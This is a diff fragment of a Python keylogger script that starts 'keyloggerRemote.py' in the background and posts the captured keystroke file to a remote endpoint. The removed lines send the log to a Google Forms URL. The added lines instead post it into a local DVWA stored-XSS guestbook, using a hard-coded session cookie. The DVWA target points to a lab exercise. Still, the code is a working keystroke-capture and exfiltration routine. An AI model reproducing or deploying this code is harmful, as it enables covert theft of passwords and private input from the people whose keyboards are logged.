@@ -11,11 +11,12 @@ os.system('python3 keyloggerRemote.py &')
 time.sleep(1)
 
 def send_request():
-	form_input = open("keyboard_Input.txt")
-	form_send = form_input.read()
-	url = 'https://docs.google.com/forms/u/1/d/e/1FAIpQLSf9WQu4b2ZbgLPFHusSGuI-2W3LE3FfSPHqxxMdqqYXTg3r8w/formResponse'
-	form_data = {'entry.839337160':'This is a test'}
-	r=requests.post(url, data=form_data)
+    cookies = {'PHPSESSID':'j1p183dj1i4fc1989vcjc92ugr','security':'low'} 
+    url='http://127.0.0.1/dvwa/vulnerabilities/xss_s' 
+    form_input = open("keyboard_Input.txt") 
+    form_send = form_input.read() 
+    form_data = {'txtName':'Vader', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}   
+    r = requests.post(url, cookies=cookies, data=form_data) 
 
 def interval():
 	global startlog
